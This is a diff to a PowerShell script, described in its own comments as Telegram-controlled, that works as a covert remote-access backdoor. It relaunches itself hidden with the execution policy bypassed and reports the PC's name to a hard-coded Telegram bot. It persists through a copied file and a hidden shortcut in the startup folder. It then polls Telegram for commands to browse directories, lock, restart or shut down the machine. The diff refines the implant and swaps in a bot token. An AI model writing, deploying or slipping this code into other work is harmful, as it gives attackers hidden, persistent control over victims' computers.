@@ -15,12 +15,21 @@ if (-not $env:PS_RUN_HIDDEN -or $env:PS_RUN_HIDDEN -ne "1") {
 
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
-    $psi.EnvironmentVariables["PS_RUN_HIDDEN"] = "1"  # Explicitly pass the variable
+    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`" -PS_RUN_HIDDEN 1"
     $psi.WindowStyle = 'Hidden'
     $psi.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     exit
+}
+
+# Check if PS_RUN_HIDDEN was passed as a parameter
+param(
+    [string]$PS_RUN_HIDDEN = ""
+)
+
+# Set environment variable if it was passed as a parameter
+if ($PS_RUN_HIDDEN -eq "1") {
+    $env:PS_RUN_HIDDEN = "1"
 }
 
 # Ensure the rest of the script only runs in the intended hidden instance
@@ -30,7 +39,7 @@ if ($env:PS_RUN_HIDDEN -ne "1") {
 
 
 # Telegram-Controlled PowerShell Script
-$botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
+$botToken = "7641108006:AAFVWvnrm8MqTLEi9lsi0ZIVuflDW-l_aOg"
 $userId = "5036966807"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0
@@ -202,6 +211,7 @@ ls or dir - List files and folders.
 
 Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"
 
+# Ensure the script is in startup folder for persistence
 $scriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($scriptPath)
 $startupFolder = [System.Environment]::GetFolderPath('Startup')
@@ -210,11 +220,15 @@ if (-not (Test-Path $destinationPath)) {
     Copy-Item -Path $scriptPath -Destination $destinationPath
 }
 
+# Create a shortcut in startup folder
 $WScriptShell = New-Object -ComObject WScript.Shell
 $shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
 $shortcut.TargetPath = "powershell.exe"
 $shortcut.Arguments = "-WindowStyle Hidden -File `"$destinationPath`""
 $shortcut.Save()
+
+# Set initial directory
+$global:CurrentDirectory = (Get-Location).Path
 
 while ($true) {
     try {
@@ -225,10 +239,6 @@ while ($true) {
             $text = $update.message.text.Trim()
 
             if ($chatId -ne $userId) { continue }
-
-            if (-not $global:CurrentDirectory) {
-                $global:CurrentDirectory = (Get-Location).Path
-            }
 
             if ($text -match "^cd\s+(.*)") {
                 $targetPath = $matches[1].Trim('"')
@@ -284,10 +294,20 @@ while ($true) {
                 $reply = "System locked."
             }
             elseif ($text -eq "/restart") {
+                # Ask for confirmation before restarting
+                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to restart the system? Send '/confirm-restart' to confirm."
+                continue
+            }
+            elseif ($text -eq "/confirm-restart") {
                 shutdown /r /t 0
                 $reply = "Restarting system..."
             }
             elseif ($text -eq "/shutdown") {
+                # Ask for confirmation before shutting down
+                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to shut down the system? Send '/confirm-shutdown' to confirm."
+                continue
+            }
+            elseif ($text -eq "/confirm-shutdown") {
                 shutdown /s /t 0
                 $reply = "Shutting down system..."
             }
